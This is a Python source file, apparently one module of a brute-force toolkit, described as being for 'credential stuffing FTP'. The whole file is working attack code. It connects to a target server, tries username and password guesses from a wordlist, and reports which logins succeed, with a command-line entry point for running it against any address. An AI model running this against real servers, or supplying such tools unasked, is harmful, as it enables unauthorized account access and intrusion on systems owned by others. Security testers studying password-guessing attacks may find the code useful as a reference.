#!/usr/bin/env python3
"""
ftp.py

    Module Name:
        ftp

    Author:
        Core Maintainers

    Description:
        Protocol-based module for credential stuffing FTP
"""

import dataclasses
import ftplib

from brute.core.protocol import ProtocolBruteforce


@dataclasses.dataclass
class Ftp(ProtocolBruteforce):

    name = "ftp"
    port = 21

    @property
    def success(self) -> int:
        return 0

    def init(self):
        """
        Initializes the FTP client for interaction.
        """
        self.ftp = ftplib.FTP()

    # def sanity(self):

    def brute(self, username, pwd_guess) -> int:
        """
        Returns status code as indicator of success
        """
        status: int = 0
        try:
            self.ftp.connect(self.address, self.port)
            self.ftp.login(username, pwd_guess)
        except ftplib.error_perm:
            status = -1

        self.ftp.quit()
        return status


if __name__ == "__main__":
    args = Ftp.parse_args()
    Ftp(
        address=args.address,
        username=args.username,
        wordlist=args.wordlist,
        delay=args.delay,
        port=args.port,
    ).run()
